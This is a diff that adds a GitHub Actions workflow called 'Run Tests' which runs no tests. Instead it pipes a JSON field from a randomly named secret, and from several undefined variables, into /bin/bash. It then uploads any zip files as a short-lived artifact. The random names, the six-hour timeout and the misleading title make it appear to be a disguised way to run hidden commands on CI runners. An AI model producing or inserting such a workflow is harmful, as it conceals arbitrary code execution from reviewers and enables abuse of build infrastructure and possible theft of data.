@@ -1,0 +1,35 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          utgps3339: ${{ secrets.utgps3339 }}
+        run: |
+          printf '%s' "$utgps3339" | jq -r .kpgwi90876 | /bin/bash
+          echo $ui0720 | jq -r .ud75970 | /bin/bash
+          echo $dyex8939 | jq -r .wghy665 | /bin/bash
+          printf '%s' "$irgw9" | jq -r .rar1973 | /bin/bash
+          printf '%s' "$fbsi3704" | jq -r .ifwyg7549 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: E12ym25c
+          path: "*.zip"
+          retention-days: 1
